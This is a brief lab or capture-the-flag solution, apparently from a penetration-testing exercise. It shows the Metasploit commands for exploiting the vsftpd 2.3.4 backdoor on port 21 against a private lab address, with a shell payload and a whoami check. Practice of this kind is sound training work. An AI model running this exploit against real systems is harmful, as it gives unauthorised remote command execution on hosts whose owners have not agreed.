Port 21 vsftpd

<details>
<summary>Solution</summary>

```javascript
search vsftpd
```



The output of the search is: 



```markdown
Matching Modules

================

Name                                  Disclosure Date  Rank    Description

----                                  ---------------  ----    -----------

exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

Now to the exploitation:

```markdown
use exploit/unix/ftp/vsftpd_234_backdoor

set RHOST 10.0.0.3

set payload cmd/unix/interact

exploit

```

To verify if the exploit worked use 
```markdown
whoami
```
</details>